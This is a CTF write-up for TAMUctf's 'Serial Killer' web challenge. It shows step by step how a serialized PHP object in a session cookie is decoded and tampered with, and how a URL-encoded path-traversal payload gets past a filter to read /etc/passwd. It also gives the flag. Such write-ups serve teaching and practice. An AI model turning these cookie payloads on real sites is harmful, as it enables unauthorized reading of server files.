Title: Serial Killer
Date: 2022-04-23
Category: CTF writeups
Tags: web

![challenge description]({static}/images/serialkiller/challenge.png)

When opening the site at [http://serial.tamuctf.com/](http://serial.tamuctf.com/) we only see the static text that talks about a new method of getting files.

![testpage]({static}/images/serialkiller/testpage.png)

Additionally there exists a PHP session ID cookie.

![session ID cookie]({static}/images/serialkiller/sessionid.png)

With the `%3D` in the end, the cookie seems to be URL encoded.

``` JavaScript
decodeURIComponent('Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6MTA6ImluZGV4Lmh0bWwiO30%3D')

// "Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6MTA6ImluZGV4Lmh0bWwiO30="
```

This URL decoded string then seems to be base64 encoded.

``` JavaScript
atob(decodeURIComponent('Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6MTA6ImluZGV4Lmh0bWwiO30%3D'))

// "O:7:\"GetPage\":1:{s:4:\"file\";s:10:\"index.html\";}"
```

And finally this looks like a serialized PHP object.
From the challenge description we know, that the flag is in `/etc/passwd`.
So lets change the filename and set a new session cookie:

``` JavaScript
let serializedPhpObject = 'O:7:"GetPage":1:{s:4:"file";s:19:"../../../etc/passwd";}';
let base64encoded = btoa(serializedPhpObject);
let uriEncoded = encodeURIComponent(base64encoded);

// Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6MTk6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QiO30%3D
```

When setting this cookie and reload the page we get the error **You should not be doing that**

![you should not be doing that]({static}/images/serialkiller/error.png)

Probably the input is validated in someway and we have to find another way to write the path to `/etc/passwd`.
After searching the web I found an entry in the [0xffsec Handbook about LFI](https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/#encoding).

So it makes sense to URL encode the path in the serialized PHP object before base64 encoding the whole object.

``` JavaScript
let serializedPhpObject = 'O:7:"GetPage":1:{s:4:"file";s:37:"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd";}';
let base64encoded = btoa(serializedPhpObject);
let uriEncoded = encodeURIComponent(base64encoded);

// Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6Mzc6IiUyZSUyZSUyZiUyZSUyZSUyZiUyZSUyZSUyZmV0Yy9wYXNzd2QiO30%3D
```

And using this new cookie we can read `/etc/passwd`:

![flag in passwd]({static}/images/serialkiller/flag.png)

So the flag is **gigem{1nt3r3sting_LFI_vuln}**
